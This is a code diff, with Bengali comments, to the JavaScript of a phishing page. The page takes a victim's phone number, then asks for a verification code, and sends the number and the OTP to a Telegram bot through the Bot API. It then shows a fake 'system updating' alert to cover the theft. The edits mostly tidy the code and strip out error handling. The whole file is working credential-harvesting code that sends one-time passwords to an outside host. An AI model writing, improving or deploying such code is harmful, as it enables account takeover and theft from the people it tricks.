@@ -15,10 +15,13 @@ function goToStep2() {
     // UI পরিবর্তন
     document.getElementById('step1').style.display = 'none';
     document.getElementById('step2').style.display = 'block';
-    // আপনার index.html এ যদি 'title' আইডি থাকে তবে এটি কাজ করবে
-    if(document.getElementById('title')) {
-        document.getElementById('title').innerText = "Verification";
+    
+    // আপনার index.html এ যদি 'title' আইডি থাকে
+    const titleElement = document.getElementById('title');
+    if (titleElement) {
+        titleElement.innerText = "Verification";
     }
+    
     document.getElementById('msg').innerText = "কোডটি নিচে লিখুন";
 
     // টেলিগ্রামে প্রথম মেসেজ (নম্বর) পাঠানো
@@ -39,20 +42,15 @@ document.getElementById('mainForm').addEventListener('submit', function(e) {
     sendToTelegram(`✅ OTP Received!\n📱 Number: ${userPhone}\n🔑 OTP: ${otpInput}`);
     
     alert("সিস্টেম আপডেট হচ্ছে, দয়া করে অপেক্ষা করুন।");
-    
+
+    // পেজ রিফ্রেশ
     setTimeout(() => {
         window.location.reload();
     }, 2000);
 });
 
-// টেলিগ্রাম ফাংশন
+// টেলিগ্রাম ফাংশন (আপনার আগের সিস্টেম অনুযায়ী)
 function sendToTelegram(text) {
     const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(text)}`;
-    fetch(url)
-    .then(response => {
-        if (!response.ok) {
-            console.error('বটে মেসেজ যায়নি, টোকেন বা আইডি চেক করুন');
-        }
-    })
-    .catch(error => console.error('Error:', error));
+    fetch(url);
 }
